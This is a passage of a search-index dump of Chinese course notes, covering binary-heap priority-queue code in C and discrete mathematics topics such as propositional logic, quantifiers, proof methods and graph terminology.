\u5176\u5b9e\u66f4\u591a\u4ee5\u6570\u7ec4\u7684\u65b9\u5f0f\u5b9e\u73b0 \u5de6\u5b50\u6811\uff1a2*index \u53f3\u5b50\u6811 2*index+1 \u7236\u8282\u70b9 index/2\n// \u6ce8\u610f\uff0c\u6709\u4e2adummy head\uff0c\u6839\u8282\u70b9\u4eceindex = 1\u5f00\u59cb\n\nPriorityQueue Initialize(int MaxElements){\n    PriorityQueue H=(PriorityQueue)malloc(sizeof(struct HeapStruct));\n    if(H==NULL)\n        exit(1);\n    H-&gt;Elements=(int*)malloc((MaxElements+1)*sizeof(int)); \n    //\u7559\u4e00\u4e2a\u7a7a\u4f4d\u7ed9dummyhead\n    if(H-&gt;Elements==NULL)\n        exit(1);\n    H-&gt;Capacity=MaxElements;\n    H-&gt;Size=0;\n    return H;\n}\n</code></pre>"},{"location":"Courses/DS/FDS/%E7%BA%BF%E6%80%A7%E8%A1%A8/#delete","title":"Delete\u64cd\u4f5c","text":"<pre><code>//\u8fdb\u884cdelete\u64cd\u4f5c\uff0c\u601d\u8def\u662f\u5220\u9664\u6700\u5c0f\u5143\u7d20\uff0c\u5c06\u961f\u5c3e\u5143\u7d20\u79fb\u81f3root\u5904\uff0c\u518d\u4e0b\u6ee4\u81f3\u7b26\u5408\u8981\u6c42\nint DeleteMin(Priority H){\n    int i,child;\n    int MinElement,LastElement;\n    if(isEmpty(H))\n        return;\n    MinElement = H-&gt;Elements[1];\n    LastElement = H-&gt;Elements[H-&gt;Size--];\n    for(i=1;i*2&lt;=H-&gt;Size;i=child){\n        child = i * 2;\n        if(child != H-&gt;Size &amp;&amp; H-&gt;Elements[child+1] &lt; H-&gt;Elements[child])\n            child++;\n        if(LastElement &gt; H-&gt;Elements[child])\n            H-&gt;Elements[i] = H-&gt;Elements[child];\n        else\n            break;\n    }\n    H-&gt;Elements[i] = LastElement;\n    return MinElement;\n}\n</code></pre> <p>\u5982\u679c\u4f60\u5df2\u7ecf\u5b9a\u4e49\u8fc7\u4e86 <code>PercolateDown</code> \u7684\u51fd\u6570\uff0c\u4f60\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u6765\u5b8c\u6210\u4e0a\u8ff0 <code>DeleteMin</code> \u64cd\u4f5c\u3002</p> <pre><code>void PercolateDown(int p,PriorityQueue H){ \n//\u4e0b\u6ee4\u64cd\u4f5c\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a\u6811\u7684\u9ad8\u5ea6O(h)\uff0cminheap\u60c5\u51b5\u4e0b\u5927\u7684\u5f80\u4e0b\n    int min;\n    int value = H-&gt;Elements[p];\n    while(2*p &lt;= H-&gt;Size){\n        min = 2*p;\n        if(min+1 &lt;= H-&gt;Size &amp;&amp; H-&gt;Elements[min] &gt; H-&gt;Elements[min+1])\n        //\u8ddf\u5b50\u6811\u4e2d\u8f83\u5c0f\u7684\u6bd4\n            ++min;\n        if(H-&gt;Elements[min] &lt; value){\n            H-&gt;Elements[p] = H-&gt;Elements[min];\n            p = min;\n        }else\n            break;\n    }H-&gt;Elements[p] = value;\n}\n\nvoid PercolateUp(int p,PriorityQueue H){\n    int tmp;\n    while(p/2 &gt;= 1 &amp;&amp; H-&gt;Elements[p/2] &gt; H-&gt;Elements[p]){\n        tmp = H-&gt;Elements[p/2];\n        H-&gt;Elements[p/2] = H-&gt;Elements[p];\n        H-&gt;Elements[p] = tmp;\n        p = p/2;\n    }\n}\n</code></pre> <p>\u7531 <code>PercolateDown</code> \u53ef\u4ee5\u7b80\u5316\u5220\u9664\u6b65\u9aa4\u5982\u4e0b\uff1a</p> <pre><code>H-&gt;Elements[1] = H-&gt;Elements[H-&gt;Size--];\nPercolateDown(1,H);\n</code></pre>"},{"location":"Courses/DS/FDS/%E7%BA%BF%E6%80%A7%E8%A1%A8/#_3","title":"\u63d2\u5165\u64cd\u4f5c","text":"<p>\u5c06\u5f85\u63d2\u5165\u5143\u7d20\u653e\u5230\u6700\u540e\uff0c\u7136\u540e <code>PercolateUp</code> \u5373\u53ef</p> <pre><code>void Insert(int X,Priority H){\n    int i;\n    if(isFull(H)){\n        return;\n    }\n    for(i=++H-&gt;Size;H-&gt;Elements[i/2]&gt;X;i/=2){ //minHeap\u7684\u60c5\u51b5\n        H-&gt;Elements[i]=H-&gt;Elements[i/2];\n    }H-&gt;Elements[i]=X;\n}\n</code></pre>"},{"location":"Courses/DS/FDS/%E7%BA%BF%E6%80%A7%E8%A1%A8/#_4","title":"\u5efa\u5806\u64cd\u4f5c (\u8c03\u6574\u5efa\u5806\u6cd5)","text":"<p>\u5bf9\u4e8e\u672a\u6210\u5806\u7684Heap\uff0c\u6211\u4eec\u4e00\u822c\u4ece\\(\\lfloor \\frac{n}{2} \\rfloor\\)\u5f00\u59cb\u4e0b\u6ee4\uff0c\u5b8c\u6210\u6392\u5e8f\uff0c\u5e76\u4e14\u65f6\u95f4\u590d\u6742\u5ea6\u4e3aO(n)\u3002</p> \\[T=\\sum_1^{h+1} 2^{h+1} -1 -2^h= 2^{h+1} -1-(h+1)=O(n)\\] <pre><code>for(int i=H-&gt;Size/2;i&gt;=1;--i)\n    PercolateDown(i,H);\n</code></pre>"},{"location":"Courses/DS/FDS/%E7%BA%BF%E6%80%A7%E8%A1%A8/#d-heap","title":"d-heap","text":"<p>\u6ce8\u610f\uff0cd-heap \u6307\u4e00\u4e2a\u8282\u70b9\u6709 d \u4e2a\u5b69\u5b50\uff08\u4ecd\u7136\u662f\u5b8c\u5168\u6811\uff09</p> <pre><code>child(i,j) = d*(i-1)+2+j;    \n// i\u662f\u7236\u4eb2\u7ed3\u70b9\u7684\u4e0b\u6807\uff0cj\u662f\u7b2c\u51e0\u4e2a\u513f\u5b50\uff0c\u8303\u56f4\u662f0~d-1\nparent(i) = (i-2+d)/d;\nlast_have_leaf = (size()+1)/d;\n// \u8fd9\u662fd-heap\u6700\u540e\u4e00\u4e2a\u6709\u53f6\u5b50\u7684\u7ed3\u70b9\u3002\u5728heap\u91cc\u662fsize()/2)\n</code></pre>"},{"location":"Courses/DS/FDS/%E7%BA%BF%E6%80%A7%E8%A1%A8/#_5","title":"\u5806\u6392\u5e8f","text":"<p>\u5229\u7528\u6700\u5927\u5806\u6700\u5927\u7684\u5143\u7d20\u5728\u6839\u8282\u70b9\u7684\u6027\u8d28\uff0c\u53ef\u4ee5\u5bf9\u6570\u7ec4\u8fdb\u884c\u6392\u5e8f\u3002</p> <p>\u5177\u4f53\u5b9e\u73b0\u539f\u7406\u4e3a:</p> <ul> <li>\u5148\u5c06\u521d\u59cb\u7684 R[1,...,n] \u5efa\u7acb\u6210\u6700\u5927\u5806\uff0c\u6b64\u65f6\u662f\u65e0\u5e8f\u5806\uff0c\u800c\u5806\u9876\u662f\u6700\u5927\u5143\u7d20\u3002</li> <li>\u518d\u5c06\u5806\u9876 R[1] \u548c\u6700\u540e\u4e00\u4e2a\u5143\u7d20 R[n] \u4ea4\u6362\uff0c\u7531\u6b64\u5f97\u5230\u65b0\u7684\u65e0\u5e8f\u533a R[1,...,n-1] \u4e0e\u6709\u5e8f\u533a R[n]\u3002</li> <li>\u5c06\u65e0\u5e8f\u533a\u518d\u6b21\u5efa\u5806(\u53ea\u7528\u5bf9 R[1] \u8fdb\u884c\u4e0b\u6ee4\u64cd\u4f5c\u5373\u53ef)\uff0c\u91cd\u590d\u4e0a\u8ff0\u64cd\u4f5c\u3002</li> <li>\u76f4\u5230\u65e0\u5e8f\u533a\u53ea\u5269\u4e0b\u6700\u540e\u4e00\u4e2a\u5143\u7d20\uff0c\u53ef\u4ee5\u5f97\u5230\u9012\u589e\u5e8f\u5217\u3002</li> </ul>"},{"location":"Courses/DiscreteMathematics/","title":"\u5199\u5728\u524d\u9762","text":""},{"location":"Courses/DiscreteMathematics/#_1","title":"\u5199\u5728\u524d\u9762","text":"<p> \u7ea6 141 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p> <p>\u6211\u4e2a\u4eba\u5199\u7684\u7b14\u8bb0\u4e3b\u8981\u6ce8\u91cd\u81ea\u5df1\u80fd\u770b\u61c2\uff0c\u56e0\u6b64\u522b\u4eba\u770b\u6765\u6216\u8bb8\u6742\u4e71\u65e0\u7ae0\u3002</p> <p>\u4f46\u662f\u6211\u5728\u53cb\u60c5\u94fe\u63a5\u90e8\u5206\u63a8\u8350\u4e86\u4e24\u4f4d\u5b66\u957f\u7684\u79bb\u6563\u6570\u5b66\u7b14\u8bb0\uff0c\u5982\u679c\u5e0c\u671b\u8be6\u5c3d\u70b9\u3001\u63a5\u8fd1\u4e66\u672c\u5185\u5bb9\u7684\uff0c\u53ef\u4ee5\u770bkaleo\u7684\u8bed\u96c0\uff1b\u5982\u679c\u5e0c\u671b\u770b\u5230\u7b80\u5355\u660e\u4e86\uff0c\u6613\u61c2\u7684\u7b14\u8bb0\uff0c\u8bf7\u770bOneko Zone\u5b66\u957f\u7684\u7b14\u8bb0\u3002</p>"},{"location":"Courses/DiscreteMathematics/#_2","title":"\u8bc4\u5206\u6807\u51c6","text":"<ul> <li>\u65e5\u5e38\u4f5c\u4e1a 10%</li> <li>\u4e24\u6b21\u5c0f\u6d4b 20%</li> <li>\u671f\u4e2d\u8003\u8bd5 20%</li> <li>\u671f\u672b\u8003\u8bd5 50%</li> </ul> <p>\u671f\u672b\u6210\u7ee9\u53ef\u4ee5\u8986\u76d6\u671f\u4e2d\u6210\u7ee9</p>"},{"location":"Courses/DiscreteMathematics/#reference","title":"Reference","text":"<ul> <li>Oneko Zone</li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter1/","title":"CH 1. Logic and Proofs","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter1/#ch-1-logic-and-proofs","title":"CH 1 : Logic and Proofs","text":"<p> \u7ea6 1090 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter1/#11-propositional-logic","title":"1.1 Propositional Logic \uff08\u547d\u9898\u903b\u8f91\uff09","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter1/#definition","title":"Definition","text":"<ul> <li>A proposition is a declarative sentence that is either true or false, but not both. \u4e5f\u5c31\u662f\u8bf4\u5fc5\u987b\u8981\u6709\u610f\u4e49\uff0c\u6bd4\u5982\uff1a</li> <li><code>Where am I?</code>  \u4e0d\u662f</li> <li><code>Cheer up!</code> \u4e0d\u662f</li> <li><code>X+1=2</code> \u4e0d\u662f\uff0cits truth depends on x</li> <li><code>1+1=2</code> \u662f</li> <li><code>Hangzhou is the capital of China.</code> \u662f</li> <li><code>The teacher exclaimed, \u201cDon\u2019t come into class late again!\u201d</code> \u662f\uff08\u8bf4\u8bdd\u8fd9\u4e2a\u884c\u4e3a\u662f\uff0c\u5185\u5bb9\u65e0\u6240\u8c13\uff09</li> </ul> <p>Warning</p> <p>\u201cThis statement is false.\u201d is not a proposition \u56e0\u4e3a\u5b83\u65e2\u4e0d\u662ftrue\u4e5f\u4e0d\u662ffalse</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter1/#_1","title":"\u7ec4\u6210","text":"<ul> <li>Propositional variables:\u00a0 small letters such as\u00a0 p, q, r, s \u2026</li> <li>Truth value: T (true proposition), F (false proposition)</li> <li>Logical operators (Connectives): be used to form compound propositions from existing propositions<ul> <li>Negation operator  \\(\\neg(NOT)\\)</li> <li>Conjunction operator  \\(\\land(AND)\\)</li> <li>Disjunction operator  \\(\\lor(OR)\\)</li> <li>Exclusive or operator  \\(\\oplus(XOR)\\)</li> <li>Conditional operator  \\(\\to(IF-THEN)\\) \u4e00\u822c\u6765\u8bb2\u662f\\(p\\to q \u6307If\\ p\uff0cthen\\ q\u6216\u662fp\\ implies\\ q\uff0c\u4f46\u662fp\\ only\\ if\\ q\u4e5f\u662f\u8fd9\u79cd\u8868\u8fbe\uff0c\u8bf7\u6ce8\u610f\u54e6\\)</li> <li>Biconditional operator  \\(\\leftrightarrow(IF\\ AND\\ ONLY\\ IF)\\)</li> </ul> </li> </ul> <p>Precedence</p> <p>\\(\\neg\\) &gt;\\(\\land\\)=\\(\\lor\\)&gt;\\(\\to\\)=\\(\\leftrightarrow\\)</p> <p>\u8fd9\u4e5f\u8bf4\u660e\uff1a p \\(\\lor\\) q \\(\\to\\) r\u00a0 means\u00a0 (p \\(\\lor\\) q) \\(\\to\\) r</p> <ul> <li>Converse \uff1a \u9006\u547d\u9898</li> <li>Inverse : \u5426\u547d\u9898(\u5b58\u7591) \u8fd9\u4e2ainverse\u5b9e\u9645\u4e0a\u662f \\(p\\rightarrow q \\Rightarrow \\neg p \\rightarrow \\neg q\\)</li> <li>Contrapositive : \u9006\u5426\u547d\u9898</li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter1/#12-application-of-propositional-logic","title":"1.2 Application of Propositional Logic","text":"<p>\u597d\u50cf\u6ca1\u4ec0\u4e48</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter1/#13-propositional-equivalences","title":"1.3 Propositional Equivalences","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter1/#classification","title":"Classification","text":"<ul> <li>Tautology: compound proposition that is always true</li> <li>Contradiction: compound proposition\u00a0 that is always false</li> <li>Contingency: compound proposition that is neither a tautology nor a contradiction.</li> </ul> <p>\u6b64\u5904\u4ec5\u5217\u51fa\u8f83\u4e3a\u96be\u8bb0\u5fc6\u7684\u5b9a\u7406\uff1a</p> <ul> <li>Absorption laws:<ul> <li>\\(p\\lor (p\\land q)\\equiv p\\)</li> <li>\\(p\\land (p\\lor q)\\equiv p\\)</li> </ul> </li> <li>Logical equivalence involving biconditional statements:<ul> <li>\\(p\\leftrightarrow q\\equiv (p\\land q)\\lor(\\neg p\\land \\neg q)\\)</li> <li>\\(\\neg(p\\leftrightarrow q)\\equiv p\\leftrightarrow \\neg q\\)</li> </ul> </li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter1/#14-predicates-and-quantifiers","title":"1.4 Predicates and Quantifiers","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter1/#predicates","title":"Predicates \u8c13\u8bcd","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter1/#definition_1","title":"Definition","text":"<p>A predicate (propositional function) is a statement that contains variables. Once the values of the variables are specified, the function has a truth value.</p> <p>Predicates \u4f8b\u5b50</p> <ul> <li><code>P(X)=\"x&gt;3\"</code></li> <li><code>Q(x,y)=\"x is the best player in the team y\"</code></li> <li><code>R(x,y,z)=\"x+y=z\"</code></li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter1/#quantifiers","title":"Quantifiers \u91cf\u8bcd","text":"<p>\u5206\u4e3aUniversal quantification \\(\\forall\\) \u548c Existential quantification \\(\\exists\\)</p> <p>\u9700\u8981\u6ce8\u610f\uff0c\u91cf\u8bcd\u7684\u4f18\u5148\u7ea7\u5927\u4e8e\u6240\u6709\u7684\u903b\u8f91\u8fd0\u7b97\u7b26\u53f7\uff0c\u6240\u4ee5:</p> <p>\\(\\forall x P(x)\\land Q(x) = (\\forall x P(x))\\land Q(x)\\)</p> <p>\u56e0\u6b64\uff0c\u4e00\u5b9a\u8981\u8bb0\u5f97\u52a0\u62ec\u53f7\u54e6~</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter1/#binding-variables","title":"Binding Variables","text":"<ul> <li>A variable is bound if it is quantified </li> <li>A variable is free if it is neither quantified nor specified with a value</li> </ul> <p>Example</p> <p>\\(\\exists x\\ (x+y)=1\\) \u4e2d\uff0cx\u662fbound\uff0cy\u662ffree</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter1/#logical-equivalences","title":"Logical Equivalences","text":"<ul> <li>\\(\\forall x(A(x)\\land B(x))\\equiv \\forall x A(x) \\land \\forall x B(x)\\)</li> <li>\\(\\exists x(A(x)\\lor B(x))\\equiv \\exists x A(x) \\lor \\exists x B(x)\\)</li> <li>\\(\\forall x(A(x)\\lor B(x))\\ne \\forall x A(x) \\lor \\forall x B(x)\\)</li> <li>\\(\\exists x(A(x)\\land B(x))\\ne \\exists x A(x) \\land \\exists x B(x)\\)</li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter1/#15-nested-quantifiers","title":"1.5 Nested Quantifiers","text":"<p>\u540c\u79cd\u7c7b\u578b\u7684\u91cf\u8bcd\u5d4c\u5957\u53ef\u4ee5\u4e92\u6362\uff0c\u4f46\u662f\u4e0d\u540c\u5c31\u4e0d\u884c</p> <p>For example:</p> <ul> <li>\\(\\exists x\\exists y\\ P(x,y)\\equiv \\exists y\\exists x\\ P(x,y)\\)</li> <li>\\(\\exists x\\forall y\\ P(x,y) \\ne \\forall y\\exists x\\ P(x,y)\\)</li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter1/#16-rules-of-inference","title":"1.6 Rules of Inference","text":"<p>\u5176\u4e2d\u5c24\u5176\u9700\u8981\u8bb0\u4f4f\u6700\u540e\u4e00\u6761<code>Resolution</code></p>"},{"location":"Courses/DiscreteMathematics/note/Chapter1/#17-introduction-to-proofs","title":"1.7 Introduction to Proofs","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter1/#some-terminology","title":"Some Terminology\uff08\u672f\u8bed\uff09","text":"<ul> <li>theorem \u5b9a\u7406\uff0c\u5b9a\u5f8b</li> <li>Axioms \u516c\u7406\uff0c\u81ea\u660e\u4e4b\u7406 = postulates \u5047\u8bbe\uff0c\u524d\u63d0     \u5373\u6211\u4eec\u5047\u5b9a\u662f\u5bf9\u7684statements</li> <li>lemma \u5f15\u7406</li> <li>corollary \u63a8\u8bba</li> <li>conjecture \u63a8\u6d4b \u5982\u679cconjecture\u88ab\u8bc1\u660e\u4e3aTrue\uff0c\u5b83\u5c31\u53d8\u6210\u4e86theorem</li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter1/#proof-by-contraposition","title":"Proof by Contraposition \u53cd\u8bc1\u6cd5","text":"<p>\\(P\\to Q \\equiv \\neg Q\\to \\neg P\\)</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter1/#vacuous-proof","title":"Vacuous Proof","text":"<p>If we know P is false then\u00a0 \\(P\\to Q\\) is vacuously true.</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter1/#trivial-proof","title":"Trivial Proof","text":"<p>If we know Q is true, then \\(P\\to Q\\) is true</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter1/#proof-p-by-contradiction","title":"Proof p by Contradiction","text":"<p>\u6b65\u9aa4\uff1a</p> <ul> <li>\u5047\u8bbep\u662fFalse</li> <li>\u63a8\u5bfc\u51fa\u4e00\u5bf9\u77db\u76fe\u7684\u7ed3\u8bba</li> <li>\u8bf4\u660ep\u662fTrue</li> </ul> <p>\u4e0d\u5b58\u5728\u6700\u5927\u8d28\u6570\u7684\u8bc1\u660e</p> <p></p>"},{"location":"Courses/DiscreteMathematics/note/Chapter1/#18-proof-methods-and-strategy","title":"1.8 Proof Methods and Strategy","text":"<p>\u4e3e\u4f8b\u6cd5\u548c\u7a77\u4e3e\u6cd5</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter1/#appendix-normalforms","title":"Appendix : NormalForms","text":"<p>Definition A set of logical operators is called functionally complete if every compound proposition is logically equivalent to a compound proposition involving only this set of logical operators. \u5373\u53ef\u4ee5\u7528\u8fd9\u7ec4\u903b\u8f91\u8fd0\u7b97\u8868\u793a\u6240\u6709\u7684\u903b\u8f91\u8fd0\u7b97,\u5982 \\(\\neg \\ and\\ \\land(\\lor)\\)</p> <p>Definition Disjunctive clauses are disjunctions with one or more literals (\\(p\\ or\\ \\neg p\\)) as disjuncts.</p> <p>Example</p> <ul> <li>\\(q\\lor r\\) Disjunctive clause</li> <li>\\(\\neg q\\land p\\) Conjunctive clause</li> <li>\\(p\\land q\\lor r\\) Not a clause</li> </ul> <p>Definition A conjunction with one or more disjunctive clauses as its conjuncts is said to be in conjunctive normal form. (Conjunction \u662f\u4e2d\u95f4\u90fd\u662f\\(\\land\\))</p> <p>Example</p> <ul> <li>\\(p\\land (q\\lor r)\\) \u221a</li> <li>\\(\\neg q\\land p\\) \u221a</li> <li>\\(p\\land ((p\\land q)\\lor r)\\) \u00d7</li> </ul> <p>\u76f8\u5e94\u7684\uff0cFull Conjunctive Normal Form \u5c31\u662f\u5728conjunctive normal form\u7684\u57fa\u7840\u4e0a\u8981\u6c42\u6240\u6709\u5b57\u6bcd\u90fd\u5728clauses\u4e2d\u51fa\u73b0\uff0c\u5982: $$ (p\\lor q\\lor r)\\land(p\\lor q\\lor \\neg r)\\land(\\neg p\\lor \\neg q\\lor r) $$</p> <p>\u53e6\u4e00\u79cd\u8868\u8fbe\u65b9\u5f0f\u662fFull Conjunctive Normal Form\u662fa conjunction of maxterms</p> <p>Definition Prenex Normal Form \u7b80\u5355\u6765\u8bb2\uff0c\u5c31\u662f\u5c06\u6240\u6709Quantifiers\u653e\u5230\u524d\u9762\u7684\u5f62\u5f0f</p> <p>Example</p> <ul> <li>\\(\\forall xP(x)\\ \\lor \\ \\forall Q(x)\\)  \u4e0d\u662f</li> <li>\\(\\forall x\\forall y \\ \\neg(P(x)\\lor Q(x))\\)  \u662f</li> <li>\\(\\neg \\forall xR(x)\\) \u4e0d\u662f</li> </ul> <p></p> <p>\u5982\u9898\uff0cPrenex\u4e0d\u9700\u8981\u5316\u7b80\uff0c\u628a\u6240\u6709\u53d8\u91cf\u6539\u6210\u4e0d\u540c\u540d\u5b57\u653e\u5230\u524d\u9762\u5373\u53ef</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter10/","title":"CH 10. Graphs","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter10/#ch-10-graphs","title":"CH 10 : Graphs","text":"<p> \u7ea6 2658 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 13 \u5206\u949f</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter10/#101-graphs-and-graphs-models","title":"10.1 Graphs and Graphs Models","text":"<ul> <li>Simple graph: \u540c\u4e00\u5bf9\u9876\u70b9\u4e4b\u95f4\u53ea\u6709\u4e00\u6761\u8fb9</li> <li>Multigraph: \u540c\u4e00\u5bf9\u9876\u70b9\u4e4b\u95f4\u53ef\u80fd\u6709\u591a\u6761\u8fb9</li> <li>Pseudograph: \u53ef\u80fd\u5b58\u5728\u81ea\u73af\u3001\u540c\u4e00\u5bf9\u9876\u70b9\u4e4b\u95f4\u53ef\u80fd\u6709\u591a\u6761\u8fb9</li> <li>Path: \\(\\{v_0 ,v_1\\},...,\\{v_{n-1} ,v_{n}\\}\\) \uff0c\u957f\u5ea6\u4e3an\u7684\u8def\u5f84<ul> <li>\u957f\u5ea6\u4e3a0\u7684\u8def\u5f84\u53ea\u542b\u4e00\u4e2a\u70b9</li> </ul> </li> <li>Circuit: \u9996\u5c3e\u662f\u540c\u4e00\u4e2a\u70b9\u7684path</li> </ul> \u8bc1\u660eShow that for any simple graph G , one of G and G' is connected <p>Case 1:\u00a0Both\u00a0u\ud835\udc62\u00a0and\u00a0v\ud835\udc63\u00a0lie in\u00a0H\ud835\udc3b. Let\u00a0w\ud835\udc64\u00a0be a vertex of\u00a0K\ud835\udc3e. Since\u00a0u\ud835\udc62\u00a0and\u00a0v\ud835\udc63\u00a0are not adjacent to\u00a0w\ud835\udc64\u00a0in\u00a0G\ud835\udc3a, they must both be adjacent to\u00a0w\ud835\udc64\u00a0in\u00a0G\u2032\ud835\udc3a\u2032, so\u00a0u\u2212w\u2212v\ud835\udc62\u2212\ud835\udc64\u2212\ud835\udc63\u00a0is a\u00a0u\u2212v\ud835\udc62\u2212\ud835\udc63\u00a0path in\u00a0G\u2032\ud835\udc3a\u2032.\u00a0Case 2:\u00a0u\ud835\udc62\u00a0is in\u00a0H\ud835\udc3b\u00a0and\u00a0v\ud835\udc63\u00a0is in\u00a0K\ud835\udc3e. In this case,\u00a0u\ud835\udc62\u00a0and\u00a0v\ud835\udc63\u00a0are not adjacent in\u00a0G\ud835\udc3a, so they must be adjacent in\u00a0G\u2032\ud835\udc3a\u2032. In any case, we have a\u00a0u\u2212v\ud835\udc62\u2212\ud835\udc63\u00a0path in\u00a0G\u2032\ud835\udc3a\u2032, so\u00a0G\u2032\ud835\udc3a\u2032\u00a0is connected.</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter10/#102-graph-terminology-and-special-types-of-graphs","title":"10.2 Graph Terminology\u00a0 and Special Types of Graphs","text":"<ul> <li>\u5bf9\u4e8e\u65e0\u5411\u56fe\uff0c\\(\\Sigma _{v\\in V} deree(v)=2e\\)  \uff08\u81ea\u73af\u7b97\u589e\u52a0\u4e24\u4e2adegree\uff09<ul> <li>\u56e0\u6b64\u6709\u5f15\u7406\uff1a\u65e0\u5411\u56fe\u62e5\u6709\u5947\u6570\u4e2adegree\u7684vertex\u4e00\u5b9a\u6709\u5076\u6570\u4e2a</li> </ul> </li> <li>\u5bf9\u4e8e\u6709\u5411\u56fe\uff0c\\(\\Sigma _{v\\in V} deree^+(v) = \\Sigma _{v\\in V} deree^-(v) =e\\)</li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter10/#some-special-simple-graphs","title":"Some Special Simple Graphs","text":"Complete Graphs Cycle GraphsWheel Graphsn-Cubes Graphs <ul> <li>Denoted as \\(K_n\\)</li> <li>Has \\(\\frac{n(n-1)}{2}\\) edges </li> </ul> <ul> <li>Denoted as \\(C_n\\) where \\(n\\gt 2\\) </li> </ul> <ul> <li>Denoted as \\(W_n\\) where \\(n\\gt 2\\) </li> </ul> <ul> <li>Denoted as \\(Q_n\\)</li> <li>\u6bcf\u4e2a\u9876\u70b9\u4e4b\u548c\u76f8\u5dee\u4e00\u4f4d(\u6309\u7167bit position)\u7684\u6570\u76f8\u8fde</li> <li>\u542b\u6709 \\(2^n\\) Vertices , \\(\\frac{n2^n}{2}\\) edges </li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter10/#bipartite-graphs","title":"Bipartite Graphs \u4e8c\u90e8\u56fe","text":"<ul> <li>\u8282\u70b9\u96c6\u53ef\u4ee5\u5206\u6210\u4e24\u4e2a \u4e0d\u76f8\u4ea4 \u7684\u5b50\u96c6\uff0c\u4f7f\u5f97\u6bcf\u6761\u8fb9\u90fd\u8fde\u63a5\u4e24\u4e2a\u4e0d\u540c\u5b50\u96c6\u4e2d\u7684\u7ed3\u70b9\u3002\u5373\u5728\u540c\u4e00\u4e2a\u5b50\u96c6\u4e2d\u7684\u7ed3\u70b9\u4e4b\u95f4\u6ca1\u6709\u8fb9\u76f8\u8fde</li> </ul> <p>Example</p> <p></p> <p>Theorem A simple graph is bipartite if and only if it is\u00a0possible to assign one of two different colors to each vertex of the graph so that no two adjacent vertices are assigned the\u00a0same color.</p> <p>\u4e00\u4e2aSimple Graph\u4e3a\u4e8c\u90e8\u56fe\u5f53\u4e14\u4ec5\u5f53\u53ef\u4ee5\u5206\u914d\u4e24\u79cd\u989c\u8272\u7ed9\u6240\u6709vertex\u4f7f\u5f97\u6bcf\u4e00\u4e2a\u76f8\u90bb\u7684vertex\u989c\u8272\u90fd\u4e0d\u540c</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter10/#regular-graph","title":"Regular Graph","text":"<p>A simply graph is called regular if every vertex of this graph has the same degree. \u6240\u6709vertex\u7684degree\u76f8\u540c</p> <p>Note</p> <p>A regular graph is called n-regular if every vertex in this graph has degree n.</p> <p>\u5982 \\(K_n\\) \u5c31\u662f (n-1)-Regular</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter10/#103-representing-graphs-and-graph-isomorphism","title":"10.3 Representing Graphs and Graph Isomorphism","text":"Adjacency List for a directed graphAdjacency MatrixIncidence Matrix <p>\u81ea\u73af\u4e5f\u662f1  \u65e0\u5411\u56fe\u7684\u90bb\u63a5\u77e9\u9635\u662f\u5bf9\u79f0\u7684</p> <p>\u4ee5\u90bb\u63a5\u8fb9\u8868\u793a\u56fe </p>"},{"location":"Courses/DiscreteMathematics/note/Chapter10/#isomorphism-of-graphs","title":"Isomorphism of Graphs \u56fe\u7684\u540c\u6784","text":"<ul> <li>Definition\uff1a\u5bf9\u4e8e\u4e24\u4e2aSimple Graph <code>G_1</code> \u548c <code>G_2</code>\uff0c\u82e5\u5bf9\u4e8e <code>G_1</code> \u7684\u4efb\u610f\u76f8\u90bb\u7684Vertex\uff0ca\u548cb\uff0c\u5b58\u5728\u4e00\u4e2aBijection Function\uff0c\u4f7f\u5f97 f(a)\u548cf(b)\u90fd\u5728 <code>G_2</code> \u4e2d\u4e14\u76f8\u90bb\uff0c\u5219\u79f0\u8fd9\u4e2a function \u662f Isomorphism</li> <li>Invariant in isomorphic graphs \uff1a (\u540c\u6784\u4e0d\u53d8\u91cf)<ul> <li>Vertex\u7684\u4e2a\u6570</li> <li>Edge\u7684\u4e2a\u6570</li> <li>\u5bf9\u5e94Vertex\u7684Degree</li> <li>\u5982\u679c\u4e00\u4e2a\u56fe\u662fBipartite\u7684\uff0c\u90a3\u4e48\u53e6\u4e00\u4e2a\u80af\u5b9a\u4e5f\u662f</li> <li>\u5982\u679c\u4e00\u4e2a\u56fe\u662fComplete\u7684\uff0c\u90a3\u4e48\u53e6\u4e00\u4e2a\u80af\u5b9a\u4e5f\u662f </li> <li>\u5982\u679c\u4e00\u4e2a\u56fe\u662f\u4e00\u4e2aSpecial Graph\uff0c\u5982Wheel\uff0c\u90a3\u4e48\u53e6\u4e00\u4e2a\u4e5f\u662f</li> </ul> </li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter10/#104-connectivity","title":"10.4 Connectivity \u8fde\u901a\u6027","text":"<ul> <li>Simple 